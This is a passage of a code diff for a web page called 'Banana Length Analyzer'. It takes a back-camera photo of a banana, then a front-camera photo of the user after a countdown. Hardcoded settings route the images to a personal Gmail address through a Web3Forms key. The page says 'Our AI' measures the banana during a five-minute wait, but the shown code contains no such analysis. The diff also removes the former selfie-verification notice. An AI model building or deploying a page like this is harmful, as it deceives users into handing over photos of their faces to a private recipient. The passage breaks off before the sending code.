@@ -2,10 +2,16 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Fruit Quality Analyzer Pro</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+  <title>Banana Length Analyzer | DualCapture</title>
   <link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet" />
   <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
     :root {
       --yellow: #FFE135;
       --dark-yellow: #F5C800;
@@ -13,9 +19,9 @@
       --cream: #FFF9E6;
       --green: #4CAF50;
       --blue: #3B82F6;
-      --shadow: 0 8px 32px rgba(59,42,26,0.18);
+      --shadow: 0 12px 32px rgba(59, 42, 26, 0.2);
     }
-    * { box-sizing: border-box; margin: 0; padding: 0; }
+
     body {
       font-family: 'DM Mono', monospace;
       background: var(--cream);
@@ -24,343 +30,650 @@
       flex-direction: column;
       align-items: center;
       overflow-x: hidden;
+      position: relative;
     }
+
     body::before {
       content: '';
-      position: fixed; top: -120px; left: -120px;
-      width: 420px; height: 420px;
+      position: fixed;
+      top: -120px;
+      left: -120px;
+      width: 420px;
+      height: 420px;
       background: radial-gradient(circle, #FFE13588 0%, transparent 70%);
-      border-radius: 50%; z-index: 0;
+      border-radius: 50%;
+      z-index: 0;
       animation: blobMove 7s ease-in-out infinite alternate;
     }
+
     body::after {
       content: '';
-      position: fixed; bottom: -100px; right: -100px;
-      width: 350px; height: 350px;
+      position: fixed;
+      bottom: -100px;
+      right: -100px;
+      width: 350px;
+      height: 350px;
       background: radial-gradient(circle, #F5C80055 0%, transparent 70%);
-      border-radius: 50%; z-index: 0;
+      border-radius: 50%;
+      z-index: 0;
       animation: blobMove2 9s ease-in-out infinite alternate;
     }
-    @keyframes blobMove { from{transform:translate(0,0) scale(1);} to{transform:translate(40px,30px) scale(1.1);} }
-    @keyframes blobMove2 { from{transform:translate(0,0) scale(1);} to{transform:translate(-30px,-20px) scale(1.08);} }
+
+    @keyframes blobMove {
+      from { transform: translate(0,0) scale(1); }
+      to { transform: translate(40px,30px) scale(1.1); }
+    }
+
+    @keyframes blobMove2 {
+      from { transform: translate(0,0) scale(1); }
+      to { transform: translate(-30px,-20px) scale(1.08); }
+    }
 
     header {
-      position: relative; z-index: 1;
-      width: 100%; max-width: 540px;
-      padding: 36px 24px 8px;
+      position: relative;
+      z-index: 1;
+      width: 100%;
+      max-width: 540px;
+      padding: 32px 24px 8px;
       text-align: center;
     }
-    .emoji-title { font-size: 3rem; display: block; animation: bounce 1.6s ease-in-out infinite; filter: drop-shadow(0 4px 8px #F5C80088); }
-    @keyframes bounce { 0%,100%{transform:translateY(0);} 50%{transform:translateY(-10px);} }
-    h1 { font-family: 'Syne', sans-serif; font-size: 2rem; font-weight: 800; color: var(--brown); letter-spacing: -1px; line-height: 1.1; margin-top: 6px; }
-    h1 span { color: var(--dark-yellow); }
-    .subtitle { font-size: 0.75rem; color: #8a6a3a; margin-top: 6px; letter-spacing: 0.12em; text-transform: uppercase; }
 
-    /* Step indicator */
-    .steps-bar {
-      position: relative; z-index: 1;
-      display: flex; align-items: center; justify-content: center;
-      gap: 0; margin: 18px 0 0;
-      width: 100%; max-width: 400px;
-      padding: 0 24px;
+    .emoji-title {
+      font-size: 3rem;
+      display: block;
+      animation: gentleBounce 1.6s ease-in-out infinite;
+      filter: drop-shadow(0 6px 12px rgba(245, 200, 0, 0.4));
     }
+
+    @keyframes gentleBounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-8px); }
+    }
+
+    h1 {
+      font-family: 'Syne', sans-serif;
+      font-size: 2rem;
+      font-weight: 800;
+      color: var(--brown);
+      letter-spacing: -1px;
+    }
+
+    h1 span {
+      color: var(--dark-yellow);
+    }
+
+    .subtitle {
+      font-size: 0.7rem;
+      color: #8a6a3a;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      margin-top: 6px;
+    }
+
+    /* simplified step bar (2 steps) */
+    .steps-bar {
+      position: relative;
+      z-index: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0;
+      margin: 20px 0 0;
+      width: 100%;
+      max-width: 320px;
+      padding: 0 20px;
+    }
+
     .step-dot {
-      display: flex; flex-direction: column; align-items: center; gap: 6px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 6px;
       flex: 1;
     }
+
     .step-circle {
-      width: 36px; height: 36px; border-radius: 50%;
-      display: flex; align-items: center; justify-content: center;
-      font-family: 'Syne', sans-serif; font-weight: 800; font-size: 0.9rem;
-      border: 2.5px solid #ddd; background: #fff; color: #bbb;
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'Syne', sans-serif;
+      font-weight: 800;
+      font-size: 0.9rem;
+      border: 2.5px solid #ddd;
+      background: #fff;
+      color: #bbb;
       transition: all 0.4s;
     }
-    .step-circle.active { border-color: var(--dark-yellow); background: var(--yellow); color: var(--brown); box-shadow: 0 2px 12px #FFE13566; }
-    .step-circle.done   { border-color: var(--green); background: var(--green); color: #fff; }
-    .step-label { font-size: 0.65rem; color: #aaa; text-align: center; letter-spacing: 0.05em; text-transform: uppercase; transition: color 0.4s; }
-    .step-dot.active .step-label { color: var(--brown); }
-    .step-dot.done .step-label   { color: var(--green); }
-    .step-line { flex: 0.5; height: 2.5px; background: #ddd; margin-bottom: 22px; transition: background 0.4s; }
-    .step-line.done { background: var(--green); }
 
-    /* Card */
+    .step-circle.active {
+      border-color: var(--dark-yellow);
+      background: var(--yellow);
+      color: var(--brown);
+      box-shadow: 0 2px 12px #FFE13566;
+    }
+
+    .step-circle.done {
+      border-color: var(--green);
+      background: var(--green);
+      color: white;
+    }
+
+    .step-label {
+      font-size: 0.65rem;
+      color: #aaa;
+      text-align: center;
+      font-weight: 500;
+    }
+
+    .step-dot.active .step-label {
+      color: var(--brown);
+    }
+
+    .step-dot.done .step-label {
+      color: var(--green);
+    }
+
+    .step-line {
+      flex: 0.5;
+      height: 2.5px;
+      background: #ddd;
+      margin-bottom: 22px;
+      transition: background 0.3s;
+    }
+
+    .step-line.done {
+      background: var(--green);
+    }
+
+    /* card */
     .card {
-      position: relative; z-index: 1;
-      background: #fff; border-radius: 28px;
+      position: relative;
+      z-index: 1;
+      background: white;
+      border-radius: 32px;
       box-shadow: var(--shadow);
-      margin: 18px 16px 40px;
+      margin: 20px 16px 40px;
       padding: 24px 20px 28px;
-      max-width: 500px; width: 100%;
+      max-width: 500px;
+      width: 100%;
       border: 2.5px solid var(--yellow);
     }
 
-    /* Step header inside card */
     .step-header {
-      display: flex; align-items: center; gap: 10px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
       margin-bottom: 14px;
     }
+
     .step-badge {
-      font-family: 'Syne', sans-serif; font-weight: 800; font-size: 0.7rem;
-      background: var(--yellow); color: var(--brown);
-      border-radius: 50px; padding: 4px 12px;
-      letter-spacing: 0.06em; text-transform: uppercase;
+      font-family: 'Syne', sans-serif;
+      font-weight: 800;
+      font-size: 0.7rem;
+      background: var(--yellow);
+      color: var(--brown);
+      border-radius: 50px;
+      padding: 4px 12px;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
       white-space: nowrap;
     }
-    .step-badge.selfie { background: var(--blue); color: #fff; }
-    .step-title-text { font-family: 'Syne', sans-serif; font-weight: 700; font-size: 1rem; color: var(--brown); }
 
-    /* Video container */
+    .step-title-text {
+      font-family: 'Syne', sans-serif;
+      font-weight: 700;
+      font-size: 1rem;
+      color: var(--brown);
+    }
+
+    /* video container */
     #videoContainer {
-      position: relative; border-radius: 18px; overflow: hidden;
-      background: #1a120a; aspect-ratio: 4/3;
-      display: flex; align-items: center; justify-content: center;
-      border: 3px solid var(--yellow); margin-bottom: 16px;
-      transition: border-color 0.4s;
+      position: relative;
+      border-radius: 20px;
+      overflow: hidden;
+      background: #1a120a;
+      aspect-ratio: 4/3;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 3px solid var(--yellow);
+      margin-bottom: 16px;
+      transition: all 0.2s;
     }
-    #videoContainer.selfie-mode { border-color: var(--blue); }
-    #video, #canvas { width: 100%; height: 100%; object-fit: cover; display: block; border-radius: 15px; }
-    #canvas { display: none; }
-    #placeholderMsg { color: #FFE135; font-size: 0.85rem; text-align: center; padding: 20px; opacity: 0.8; }
 
-    .viewfinder {
-      position: absolute; top: 50%; left: 50%;
-      transform: translate(-50%,-50%);
-      width: 70%; aspect-ratio: 1;
-      pointer-events: none; display: none;
+    #video,
+    #canvas {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+      border-radius: 17px;
     }
-    .viewfinder::before,.viewfinder::after,.viewfinder span::before,.viewfinder span::after {
-      content:''; position:absolute; width:22px; height:22px;
-      border-color:var(--yellow); border-style:solid;
-    }
-    .viewfinder::before{top:0;left:0;border-width:3px 0 0 3px;border-radius:4px 0 0 0;}
-    .viewfinder::after{top:0;right:0;border-width:3px 3px 0 0;border-radius:0 4px 0 0;}
-    .viewfinder span::before{bottom:0;left:0;border-width:0 0 3px 3px;border-radius:0 0 0 4px;}
-    .viewfinder span::after{bottom:0;right:0;border-width:0 3px 3px 0;border-radius:0 0 4px 0;}
-    #video.active ~ .viewfinder { display: block; }
 
-    /* Countdown overlay */
+    #canvas {
+      display: none;
+    }
+
+    #placeholderMsg {
+      color: #FFE135;
+      font-size: 0.85rem;
+      text-align: center;
+      padding: 20px;
+      opacity: 0.9;
+    }
+
+    /* countdown overlay (clean style) */
     #countdownOverlay {
       display: none;
-      position: absolute; inset: 0;
-      background: rgba(0,0,0,0.55);
-      border-radius: 15px;
-      align-items: center; justify-content: center;
-      flex-direction: column; gap: 10px;
-      z-index: 10;
+      position: absolute;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.65);
+      border-radius: 17px;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      gap: 10px;
+      z-index: 15;
     }
-    #countdownOverlay.show { display: flex; }
-    .countdown-number {
-      font-family: 'Syne', sans-serif; font-weight: 800;
-      font-size: 5rem; color: #fff;
-      animation: popNum 1s ease-in-out;
-      text-shadow: 0 4px 20px rgba(0,0,0,0.5);
-    }
-    @keyframes popNum { 0%{transform:scale(1.5);opacity:0;} 30%{transform:scale(1);opacity:1;} 90%{opacity:1;} 100%{opacity:0;} }
-    .countdown-label { font-size: 0.85rem; color: #FFE135; letter-spacing: 0.1em; text-transform: uppercase; }
 
-    /* Selfie notice box */
-    .selfie-notice {
+    #countdownOverlay.show {
+      display: flex;
+    }
+
+    .countdown-number {
+      font-family: 'Syne', sans-serif;
+      font-weight: 800;
+      font-size: 5rem;
+      color: #FFE135;
+      text-shadow: 0 0 12px #00000066;
+      animation: popCount 0.8s ease-out;
+    }
+
+    @keyframes popCount {
+      0% { transform: scale(1.6); opacity: 0; }
+      40% { transform: scale(1); opacity: 1; }
+      100% { opacity: 1; }
+    }
+
+    .countdown-label {
+      font-size: 0.8rem;
+      letter-spacing: 0.1em;
+      background: rgba(0, 0, 0, 0.6);
+      padding: 4px 14px;
+      border-radius: 60px;
+      color: #FFE135;
+    }
+
+    /* buttons */
+    .btn-row {
+      display: flex;
+      gap: 12px;
+      justify-content: center;
+      flex-wrap: wrap;
+      margin-bottom: 12px;
+    }
+
+    .btn {
+      font-family: 'Syne', sans-serif;
+      font-weight: 700;
+      font-size: 0.9rem;
+      border: none;
+      border-radius: 60px;
+      padding: 12px 26px;
+      cursor: pointer;
+      transition: transform 0.1s, box-shadow 0.15s;
+      letter-spacing: 0.02em;
+    }
+
+    .btn:active {
+      transform: scale(0.96);
+    }
+
+    .btn-primary {
+      background: var(--yellow);
+      color: var(--brown);
+      box-shadow: 0 4px 12px #FFE13599;
+    }
+
+    .btn-primary:hover {
+      background: var(--dark-yellow);
+    }
+
+    .btn-capture {
+      background: var(--brown);
+      color: var(--yellow);
+      box-shadow: 0 4px 12px #3B2A1A66;
+      font-size: 1rem;
+      padding: 14px 34px;
+    }
+
+    .btn-capture:disabled {
+      opacity: 0.45;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    .btn-send {
+      background: var(--green);
+      color: white;
+      box-shadow: 0 4px 14px #4CAF5077;
+    }
+
+    .btn-send:hover {
+      background: #2e7d32;
+    }
+
+    .btn-retake {
+      background: transparent;
+      color: var(--brown);
+      border: 2px solid var(--brown);
+    }
+
+    .btn-retake:hover {
+      background: var(--brown);
+      color: var(--yellow);
+    }
+
+    #status {
+      text-align: center;
+      font-size: 0.75rem;
+      color: #8a6a3a;
+      margin-top: 10px;
+      letter-spacing: 0.03em;
+    }
+
+    /* popup processing */
+    #popup {
       display: none;
-      background: #EFF6FF; border: 2px solid var(--blue);
-      border-radius: 14px; padding: 14px 16px;
-      font-size: 0.78rem; color: #1e3a5f; line-height: 1.7;
+      position: fixed;
+      inset: 0;
+      background: rgba(30, 18, 6, 0.8);
+      backdrop-filter: blur(5px);
+      z-index: 200;
+      align-items: center;
+      justify-content: center;
+    }
+
+    #popup.show {
+      display: flex;
+    }
+
+    .popup-box {
+      background: white;
+      border-radius: 32px;
+      padding: 34px 28px;
+      max-width: 330px;
+      width: 90%;
+      text-align: center;
+      border: 3px solid var(--yellow);
+      animation: slideUp 0.3s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+    }
+
+    @keyframes slideUp {
+      from {
+        opacity: 0;
+        transform: translateY(30px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .popup-emoji {
+      font-size: 3rem;
+      margin-bottom: 8px;
+    }
+
+    .popup-title {
+      font-family: 'Syne', sans-serif;
+      font-size: 1.3rem;
+      font-weight: 800;
+      color: var(--brown);
+    }
+
+    .popup-msg {
+      font-size: 0.8rem;
+      color: #7a5a2a;
+      margin: 12px 0 16px;
+      line-height: 1.5;
+    }
+
+    .progress-wrap {
+      background: #f0e8d0;
+      border-radius: 50px;
+      height: 8px;
+      overflow: hidden;
       margin-bottom: 14px;
     }
-    .selfie-notice b { color: #1e3a8a; }
-    .selfie-notice.show { display: block; }
 
-    /* Buttons */
-    .btn-row { display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; margin-bottom: 14px; }
-    .btn {
-      font-family: 'Syne', sans-serif; font-weight: 700; font-size: 0.92rem;
-      border: none; border-radius: 50px; padding: 13px 26px;
-      cursor: pointer; transition: transform 0.12s, box-shadow 0.12s, background 0.15s;
-      letter-spacing: 0.03em; outline: none;
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, var(--yellow), var(--dark-yellow));
+      transition: width 1s linear;
     }
-    .btn:active { transform: scale(0.95); }
-    .btn-primary { background: var(--yellow); color: var(--brown); box-shadow: 0 4px 16px #FFE13566; }
-    .btn-primary:hover { background: var(--dark-yellow); }
-    .btn-capture { background: var(--brown); color: var(--yellow); box-shadow: 0 4px 16px #3B2A1A44; font-size: 1rem; padding: 14px 34px; }
-    .btn-capture:hover { background: #5a3e25; }
-    .btn-capture:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
-    .btn-send { background: var(--green); color: #fff; box-shadow: 0 4px 16px #4CAF5044; display: none; }
-    .btn-send:hover { background: #388E3C; }
-    .btn-send:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
-    .btn-retake { background: transparent; color: var(--brown); border: 2px solid var(--brown); display: none; }
-    .btn-retake:hover { background: var(--brown); color: var(--yellow); }
-    .btn-selfie { background: var(--blue); color: #fff; box-shadow: 0 4px 16px #3B82F644; display: none; }
-    .btn-selfie:hover { background: #2563EB; }
 
-    #status { text-align: center; font-size: 0.76rem; color: #8a6a3a; letter-spacing: 0.06em; min-height: 18px; margin-top: 4px; }
+    .popup-timer {
+      font-family: 'DM Mono', monospace;
+      font-size: 1.5rem;
+      font-weight: 600;
+      color: #3b2a1a;
+    }
 
-    /* Popup */
-    #popup { display: none; position: fixed; inset: 0; background: rgba(30,18,6,0.72); backdrop-filter: blur(6px); z-index: 100; align-items: center; justify-content: center; }
-    #popup.show { display: flex; }
-    .popup-box { background: #fff; border-radius: 28px; padding: 38px 34px 34px; max-width: 330px; width: 90%; text-align: center; border: 3px solid var(--yellow); box-shadow: 0 24px 60px rgba(59,42,26,0.35); animation: popIn 0.35s cubic-bezier(.34,1.56,.64,1); }
-    @keyframes popIn { from{transform:scale(0.7);opacity:0;} to{transform:scale(1);opacity:1;} }
-    .popup-emoji { font-size: 3.2rem; display: block; margin-bottom: 10px; animation: spin 2s linear infinite; }
-    @keyframes spin { 0%{transform:rotate(0deg) scale(1);} 25%{transform:rotate(-10deg) scale(1.1);} 75%{transform:rotate(10deg) scale(1.1);} 100%{transform:rotate(0deg) scale(1);} }
-    .popup-title { font-family: 'Syne', sans-serif; font-size: 1.4rem; font-weight: 800; color: var(--brown); margin-bottom: 8px; }
-    .popup-msg { font-size: 0.85rem; color: #7a5a2a; line-height: 1.6; margin-bottom: 20px; }
-    .popup-msg strong { color: var(--brown); }
-    .progress-wrap { background: #f0e8d0; border-radius: 50px; height: 10px; overflow: hidden; margin-bottom: 16px; }
-    .progress-bar { height: 100%; width: 0%; background: linear-gradient(90deg, var(--yellow), var(--dark-yellow)); border-radius: 50px; transition: width 1s linear; }
-    .popup-timer { font-family: 'DM Mono', monospace; font-size: 1.5rem; color: var(--brown); font-weight: 500; letter-spacing: 0.08em; }
+    .grain {
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      z-index: 999;
+      opacity: 0.02;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+      background-size: 180px;
+    }
 
-    body > .grain { position: fixed; inset: 0; pointer-events: none; z-index: 200; opacity: 0.025; background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E"); background-size: 180px; }
+    .dual-status {
+      font-weight: 500;
+    }
   </style>
 </head>
 <body>
 <div class="grain"></div>
 
 <header>
-  <span class="emoji-title">🍌</span>
+  <span class="emoji-title">🍌📸</span>
   <h1><span>Banana</span> Length Finder</h1>
-  <p class="subtitle">Precision fruit measurement technology</p>
+  <p class="subtitle">dual‑camera precision • fruit science</p>
 </header>
 
-<!-- Step indicator -->
+<!-- Simplified 2-step indicator -->
 <div class="steps-bar">
   <div class="step-dot active" id="stepDot1">
     <div class="step-circle active" id="stepCircle1">1</div>
-    <div class="step-label">Banana Photo</div>
+    <div class="step-label">Capture</div>
   </div>
   <div class="step-line" id="stepLine1"></div>
   <div class="step-dot" id="stepDot2">
     <div class="step-circle" id="stepCircle2">2</div>
-    <div class="step-label">Selfie Verify</div>
-  </div>
-  <div class="step-line" id="stepLine2"></div>
-  <div class="step-dot" id="stepDot3">
-    <div class="step-circle" id="stepCircle3">✓</div>
-    <div class="step-label">Done!</div>
+    <div class="step-label">Analyze</div>
   </div>
 </div>
 
 <div class="card">
-
-  <!-- Step header -->
   <div class="step-header">
-    <span class="step-badge" id="stepBadge">Step 1 of 2</span>
-    <span class="step-title-text" id="stepTitleText">📷 Point camera at your banana</span>
+    <span class="step-badge" id="stepBadge">📸 Dual capture</span>
+    <span class="step-title-text" id="stepTitleText">🍌 Back camera ready</span>
   </div>
 
-  <!-- Selfie notice (shown before step 2) -->
-  <div class="selfie-notice" id="selfieNotice">
-    🤳 <b>Step 2: Selfie Verification</b><br>
-    We need a quick selfie to verify you're a real person (not a bot).<br>
-    Your front camera will activate. A <b>3-second countdown</b> will appear before the photo is taken — so you're ready!
-  </div>
-
+  <!-- camera preview container -->
   <div id="videoContainer">
-    <p id="placeholderMsg">📷 Camera not started yet.<br>Click "Open Camera" below.</p>
+    <p id="placeholderMsg">📷 Tap "Open Camera" to begin<br>We'll capture banana + front photo in one go</p>
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
-    <div class="viewfinder"><span></span></div>
     <div id="countdownOverlay">
       <div class="countdown-number" id="countdownNum">3</div>
-      <div class="countdown-label">📸 Selfie in...</div>
+      <div class="countdown-label">📸 front capture in...</div>
     </div>
   </div>
 
-  <!-- Step 1 buttons -->
-  <div id="step1Buttons">
+  <!-- Main control group (Step 1) -->
+  <div id="mainControls">
     <div class="btn-row">
-      <button class="btn btn-primary" id="btnStart" onclick="startBackCamera()">📷 Open Camera</button>
-      <button class="btn btn-capture" id="btnCapture" onclick="captureBack()" disabled>📸 Capture</button>
+      <button class="btn btn-primary" id="btnStartCam">📷 Open Camera</button>
+      <button class="btn btn-capture" id="btnCaptureDual" disabled>🍌 Capture Both</button>
     </div>
     <div class="btn-row">
-      <button class="btn btn-retake" id="btnRetake" onclick="retakeBack()">🔄 Retake</button>
-      <button class="btn btn-selfie" id="btnGoSelfie" onclick="startSelfieStep()">Next: Selfie →</button>
-    </div>
-  </div>
-
-  <!-- Step 2 buttons -->
-  <div id="step2Buttons" style="display:none">
-    <div class="btn-row">
-      <button class="btn btn-primary" id="btnStartFront" onclick="startFrontCamera()">🤳 Open Front Camera</button>
-    </div>
-    <div class="btn-row">
-      <button class="btn btn-send" id="btnSend" onclick="sendBothPhotos()">📤 Send for Analysis</button>
+      <button class="btn btn-retake" id="btnRetakeAll" style="display: none;">⟳ Retake All</button>
     </div>
   </div>
 
-  <p id="status">Waiting to start...</p>
+  <!-- Send panel appears after both captures -->
+  <div id="sendPanel" style="display: none;">
+    <div class="btn-row">
+      <button class="btn btn-send" id="btnSendFinal">📤 Send for Analysis</button>
+      <button class="btn btn-retake" id="btnRetakeAfter">⟳ Retake All</button>
+    </div>
+  </div>
+
+  <p id="status">⏻ Ready — open camera & capture both images</p>
 </div>
 
-<!-- Processing Popup -->
+<!-- Processing popup -->
 <div id="popup">
   <div class="popup-box">
-    <span class="popup-emoji">⚙️</span>
-    <div class="popup-title">Processing Image</div>
-    <div class="popup-msg">
-      Our AI is carefully analyzing your banana.<br>
-      <strong>Please wait for 5 minutes</strong> while we calculate the exact length!
-    </div>
+    <span class="popup-emoji">⚖️🔬</span>
+    <div class="popup-title">Analyzing Banana</div>
+    <div class="popup-msg">Our AI measures curvature & length.<br><strong>Please wait ~5 minutes</strong> while we process both images.</div>
     <div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
     <div class="popup-timer" id="timerDisplay">05:00</div>
   </div>
 </div>
 
 <script>
-  const WEB3FORMS_KEY   = 'eb5accff-e755-4f69-862c-ac844bc38650';
+  // ---------- DOM elements ----------
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const statusDiv = document.getElementById('status');
+  const popup = document.getElementById('popup');
+  const timerDisplay = document.getElementById('timerDisplay');
+  const progressBar = document.getElementById('progressBar');
+  const countdownOverlay = document.getElementById('countdownOverlay');
+  const countdownNum = document.getElementById('countdownNum');
+
+  // Buttons
+  const btnStartCam = document.getElementById('btnStartCam');
+  const btnCaptureDual = document.getElementById('btnCaptureDual');
+  const btnRetakeAll = document.getElementById('btnRetakeAll');
+  const sendPanel = document.getElementById('sendPanel');
+  const btnSendFinal = document.getElementById('btnSendFinal');
+  const btnRetakeAfter = document.getElementById('btnRetakeAfter');
+
+  // Step UI elements
+  const stepDot1 = document.getElementById('stepDot1');
+  const stepDot2 = document.getElementById('stepDot2');
+  const stepCircle1 = document.getElementById('stepCircle1');
+  const stepCircle2 = document.getElementById('stepCircle2');
+  const stepLine1 = document.getElementById('stepLine1');
+  const stepBadge = document.getElementById('stepBadge');
+  const stepTitleText = document.getElementById('stepTitleText');
+
+  // Data state
+  let backStream = null;
+  let backPhotoURL = null;     // banana image
+  let frontPhotoURL = null;    // front camera image
+  let isBothCaptured = false;
+  let frontCaptureInProgress = false;
+
+  // Web3Forms config
+  const WEB3FORMS_KEY = 'eb5accff-e755-4f69-862c-ac844bc38650';
   const RECIPIENT_EMAIL = 'iot757978@gmail.com';
 
-  const video             = document.getElementById('video');
-  const canvas            = document.getElementById('canvas');
-  const status            = document.getElementById('status');
-  const popup             = document.getElementById('popup');
-  const timerDisplay      = document.getElementById('timerDisplay');
-  const progressBar       = document.getElementById('progressBar');
-  const countdownOverlay  = document.getElementById('countdownOverlay');
-  const countdownNum      = document.getElementById('countdownNum');
-
-  let backStream      = null;
-  let frontStream     = null;
-  let backPhotoURL    = null;
-  let selfiePhotoURL  = null;
-  let timerInterval   = null;
-
-  // ── Helpers ───────────────────────────────────
-  function captureFrame(videoEl, maxW = 800) {
+  // Helper: capture frame from video element
+  function captureFrame(videoEl, maxWidth = 800) {
     const c = document.createElement('canvas');
-    let w = videoEl.videoWidth || 640, h = videoEl.videoHeight || 480;
-    if (w > maxW) { h = Math.round(h * maxW / w); w = maxW; }
-    c.width = w; c.height = h;
-    c.getContext('2d').drawImage(videoEl, 0, 0, w, h);
-    return c.toDataURL('image/jpeg', 0.80);
+    let w = videoEl.videoWidth || 640;
+    let h = videoEl.videoHeight || 480;
+    if (w > maxWidth) {
+      h = Math.round(h * maxWidth / w);
+      w = maxWidth;
+    }
+    c.width = w;
+    c.height = h;
+    const ctx = c.getContext('2d');
+    ctx.drawImage(videoEl, 0, 0, w, h);
+    return c.toDataURL('image/jpeg', 0.82);
   }
 
-  function stopStream(s) { if (s) s.getTracks().forEach(t => t.stop()); }
-
-  // ── STEP INDICATOR ────────────────────────────
-  function setStep(n) {
-    // Reset all
-    [1,2,3].forEach(i => {
-      document.getElementById('stepDot'+i).className = 'step-dot';
-      document.getElementById('stepCircle'+i).className = 'step-circle';
-    });
-    [1,2].forEach(i => document.getElementById('stepLine'+i).className = 'step-line');
-
-    for (let i = 1; i < n; i++) {
-      document.getElementById('stepDot'+i).classList.add('done');
-      document.getElementById('stepCircle'+i).classList.add('done');
-      document.getElementById('stepLine'+i).classList.add('done');
-    }
-    if (n <= 3) {
-      document.getElementById('stepDot'+n).classList.add('active');
-      document.getElementById('stepCircle'+n).classList.add('active');
+  function stopStream(stream) {
+    if (stream) {
+      stream.getTracks().forEach(track => track.stop());
     }
   }
 
-  // ─────────────────────────────────────────────
-  //  STEP 1 — BACK CAMERA (Banana)
-  // ─────────────────────────────────────────────
+  // update step UI (1: capture, 2: done)
+  function updateStepUI(step) {
+    if (step === 1) {
+      stepDot1.classList.add('active');
+      stepDot2.classList.remove('active');
+      stepCircle1.classList.add('active');
+      stepCircle2.classList.remove('active');
+      stepCircle2.classList.remove('done');
+      stepDot2.classList.remove('done');
+      stepLine1.classList.remove('done');
+    } else if (step === 2) {
+      stepDot1.classList.remove('active');
+      stepDot1.classList.add('done');
+      stepCircle1.classList.remove('active');
+      stepCircle1.classList.add('done');
+      stepLine1.classList.add('done');
+      stepDot2.classList.add('active');
+      stepCircle2.classList.add('active');
+      stepBadge.textContent = '📤 Ready to send';
+      stepTitleText.textContent = '✨ Both images captured!';
+    }
+  }
+
+  // Reset everything (clear photos, restart back camera)
+  function fullReset() {
+    // stop any ongoing streams
+    stopStream(backStream);
+    backStream = null;
+    backPhotoURL = null;
+    frontPhotoURL = null;
+    isBothCaptured = false;
+    frontCaptureInProgress = false;
+
+    // hide send panel, show main controls
+    sendPanel.style.display = 'none';
+    document.getElementById('mainControls').style.display = 'block';
+    btnRetakeAll.style.display = 'none';
+    btnCaptureDual.disabled = true;
+    btnStartCam.disabled = false;
+    btnStartCam.textContent = '📷 Open Camera';
+    
+    // video UI reset
+    video.style.display = 'block';
+    canvas.style.display = 'none';
+    video.classList.remove('active');
+    document.getElementById('placeholderMsg').style.display = 'block';
+    document.getElementById('placeholderMsg').textContent = '📷 Tap "Open Camera" to begin\nWe\'ll capture banana + front photo in one go';
+    
+    // update step to 1 again
+    updateStepUI(1);
+    stepBadge.textContent = '📸 Dual capture';
+    stepTitleText.textContent = '🍌 Back camera ready';
+    statusDiv.textContent = '🔄 Reset complete. Open camera to start fresh.';
+  }
+
+  // Show back camera preview
   async function startBackCamera() {
     try {
-      status.textContent = 'Requesting back camera...';
+      if (backStream) stopStream(backStream);
+      statusDiv.textContent = '📷 Accessing back camera...';
       backStream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: { ideal: 'environment' }, width: { ideal: 1280 }, height: { ideal: 960 } },
+        video: { facingMode: { exact: 'environment' }, width: { ideal: 1280 }, height: { ideal: 960 } },
         audio: false
       });
       video.srcObject = backStream;
@@ -368,212 +681,245 @@
       document.getElementById('placeholderMsg').style.display = 'none';
       video.style.display = 'block';
       canvas.style.display = 'none';
-      document.getElementById('btnStart').textContent = '✅ Camera On';
-      document.getElementById('btnStart').disabled = true;
-      document.getElementById('btnCapture').disabled = false;
-      status.textContent = 'Point at your banana 🍌 then hit Capture!';
-    } catch(e) {
-      status.textContent = '⚠️ Camera access denied or unavailable.';
+      btnStartCam.disabled = true;
+      btnStartCam.textContent = '✅ Camera On';
+      btnCaptureDual.disabled = false;
+      statusDiv.textContent = '🍌 Frame your banana, then press "Capture Both"';
+    } catch (err) {
+      console.warn(err);
+      statusDiv.textContent = '⚠️ Back camera not accessible. Ensure permission and not in use.';
+      btnStartCam.disabled = false;
     }
   }
 
-  function captureBack() {
-    if (!backStream) return;
-    backPhotoURL = captureFrame(video);
-
-    // Show snapshot in canvas
-    canvas.width  = video.videoWidth  || 640;
